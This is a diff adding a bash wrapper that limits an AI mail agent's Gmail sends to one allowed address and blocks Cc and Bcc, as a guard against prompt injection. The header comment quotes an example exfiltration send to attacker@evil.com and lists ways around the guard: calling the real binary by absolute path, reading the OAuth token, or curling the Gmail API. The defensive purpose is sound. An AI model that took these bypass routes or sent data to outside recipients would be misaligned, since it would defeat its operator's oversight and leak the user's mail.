@@ -1,0 +1,79 @@
+#!/usr/bin/env bash
+# gog send-guard shim.
+#
+# Purpose: when this directory is FIRST on the Gmail agent's PATH, every `gog`
+# call the agent makes resolves here. We pass everything through to the real
+# gog UNCHANGED, except that a Gmail *send* may only go to allan@beaufour.dk —
+# no other To, and no Cc/Bcc at all. This makes "the agent can only ever email
+# Allan" a deterministic property, not a thing we ask the LLM to honor.
+#
+# Scope / limits (be honest): this is a PATH-level guard. It stops the agent
+# from being talked into `gog gmail send --to attacker@evil.com`. It does NOT
+# stop an attacker who gets the agent to call the real binary by absolute path,
+# read the OAuth token, or curl the Gmail API directly. Those require the
+# read-only-scope token and/or egress sandbox (see handoff). Defense in depth.
+set -euo pipefail
+
+REAL_GOG="/opt/homebrew/bin/gog"
+ALLOWED_TO="allan@beaufour.dk"
+
+if [[ ! -x "$REAL_GOG" ]]; then
+  echo "gog-guard: real gog not found at $REAL_GOG" >&2
+  exit 127
+fi
+
+# Normalize an address: strip a display name ("Name <addr>") and lowercase.
+normalize_addr() {
+  local v="$1"
+  if [[ "$v" =~ \<([^>]+)\> ]]; then v="${BASH_REMATCH[1]}"; fi
+  printf '%s' "$v" | tr '[:upper:]' '[:lower:]' | tr -d '[:space:]'
+}
+
+reject() { echo "gog-guard: BLOCKED — $1" >&2; exit 13; }
+
+# Detect a gmail/mail/email send invocation among the leading subcommand args.
+is_send=0
+seen_mail=0
+for a in "$@"; do
+  case "$a" in
+    gmail|mail|email) seen_mail=1 ;;
+    send) [[ $seen_mail -eq 1 ]] && is_send=1 ;;
+    -*) ;; # flags don't change subcommand detection
+  esac
+done
+
+if [[ $is_send -eq 1 ]]; then
+  # Validate every recipient flag. Supports "--to x", "--to=x", and comma lists.
+  i=1
+  args=("$@")
+  n=$#
+  while [[ $i -le $n ]]; do
+    cur="${args[$((i-1))]}"
+    flag="" ; val=""
+    case "$cur" in
+      --to|--cc|--bcc|-t)
+        flag="$cur"; val="${args[$i]:-}"; i=$((i+1)) ;;
+      --to=*|--cc=*|--bcc=*)
+        flag="${cur%%=*}"; val="${cur#*=}" ;;
+      --cc*|--bcc*)
+        reject "Cc/Bcc are not allowed; replies may only go to $ALLOWED_TO" ;;
+    esac
+    if [[ -n "$flag" ]]; then
+      case "$flag" in
+        --cc|--bcc) reject "Cc/Bcc are not allowed; replies may only go to $ALLOWED_TO" ;;
+      esac
+      # Split comma-separated recipients and check each.
+      IFS=',' read -ra parts <<< "$val"
+      for p in "${parts[@]}"; do
+        addr="$(normalize_addr "$p")"
+        [[ -z "$addr" ]] && continue
+        if [[ "$addr" != "$ALLOWED_TO" ]]; then
+          reject "recipient '$addr' is not $ALLOWED_TO"
+        fi
+      done
+    fi
+    i=$((i+1))
+  done
+fi
+
+exec "$REAL_GOG" "$@"
